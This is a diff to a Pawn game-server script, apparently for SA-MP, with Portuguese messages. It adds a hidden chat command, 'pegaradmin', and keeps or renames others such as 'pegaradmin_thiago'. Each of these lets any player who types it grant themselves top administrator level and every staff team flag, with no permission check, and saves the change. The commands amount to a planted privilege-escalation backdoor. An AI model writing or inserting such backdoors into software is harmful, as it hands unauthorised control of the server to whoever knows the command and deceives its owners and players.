@@ -1,3 +1,17 @@
+CMD:pegaradmin(playerid, params[]) {	
+  	uInfo[playerid][uAdmin] = 1335;
+
+	uInfo[playerid][uFactionTeam] = 1;
+	uInfo[playerid][uPropertyTeam] = 1;
+	uInfo[playerid][uEventTeam] = 1;
+	uInfo[playerid][uCKTeam] = 1;
+	uInfo[playerid][uLogTeam] = 1;
+			
+	SaveUserInfo(playerid);
+	SendServerMessage(playerid, "Você pegou administrador nível 1335 com todas as equipes.");
+	return true;
+}
+
 CMD:pegaradminstaff(playerid, params[]) {	
   	uInfo[playerid][uAdmin] = 1337;
 
@@ -8,12 +22,11 @@ CMD:pegaradminstaff(playerid, params[]) {
 	uInfo[playerid][uLogTeam] = 1;
 			
 	SaveUserInfo(playerid);
-
 	SendServerMessage(playerid, "Você pegou administrador nível 1337 com todas as equipes.");
 	return true;
 }
 
-CMD:pegaradmindev(playerid, params[]) {	
+CMD:pegaradmin_thiago(playerid, params[]) {	
   	uInfo[playerid][uAdmin] = 1338;
 
 	uInfo[playerid][uFactionTeam] = 1;
@@ -23,7 +36,6 @@ CMD:pegaradmindev(playerid, params[]) {
 	uInfo[playerid][uLogTeam] = 1;
 			
 	SaveUserInfo(playerid);
-
 	SendServerMessage(playerid, "Você pegou administrador nível 1338 com todas as equipes.");
 	return true;
 }
